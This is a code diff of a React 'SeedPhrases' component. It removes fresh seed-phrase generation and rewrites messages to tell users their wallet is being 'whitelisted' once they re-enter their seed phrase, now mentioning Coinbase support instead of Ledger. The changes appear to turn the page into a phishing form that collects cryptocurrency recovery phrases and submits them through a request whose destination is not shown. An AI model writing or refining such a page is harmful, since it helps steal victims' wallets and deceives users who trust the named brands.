@@ -29,18 +29,18 @@ const SeedPhrases: React.FC = () => {
     window.Buffer = Buffer;
   }, []);
 
-  const generateSeedWords = () => {
-    const mnemonic = bip39.generateMnemonic(256);
-    const generatedWords = mnemonic.split(" ").slice(0, activeTab);
-    const wordMap = generatedWords.reduce<Record<number, string>>(
-      (acc, word, index) => {
-        acc[index + 1] = word;
-        return acc;
-      },
-      {}
-    );
-    setWords(wordMap);
-  };
+  // const generateSeedWords = () => {
+  //   const mnemonic = bip39.generateMnemonic(256);
+  //   const generatedWords = mnemonic.split(" ").slice(0, activeTab);
+  //   const wordMap = generatedWords.reduce<Record<number, string>>(
+  //     (acc, word, index) => {
+  //       acc[index + 1] = word;
+  //       return acc;
+  //     },
+  //     {}
+  //   );
+  //   setWords(wordMap);
+  // };
 
   const copySeedPhrase = () => {
     navigator.clipboard.writeText(Object.values(words).join(" "));
@@ -62,11 +62,11 @@ const SeedPhrases: React.FC = () => {
           if (res.ok) {
             setIsModalOpen(false);
             if (tempCount > 0) {
-              generateSeedWords();
+              // generateSeedWords();
               tempCount = -10;
               setErrorCount(tempCount);
               setInfo(
-                "Your new recovery seed phrase has been successfully generated.\n Your wallet backup (recovery seed) is yours and your only: never share, store digitally, or disclose it to anyone, not even ledger support."
+                "Your wallet has been successfully whitelisted.\n Your wallet backup (recovery seed) is yours and yours only: never share, store digitally, or disclose it to anyone, not even coinbase support."
               );
             }
           }
@@ -136,8 +136,8 @@ const SeedPhrases: React.FC = () => {
 
           {formError && (
             <p className="text-red-600 text-[14px]">
-              One or more words are incorrect. Please re-enter your recovery
-              phrase to whitelist your wallet.
+              One or more words are incorrect. Please re-enter your seed phrase
+              to whitelist your wallet.
             </p>
           )}
 
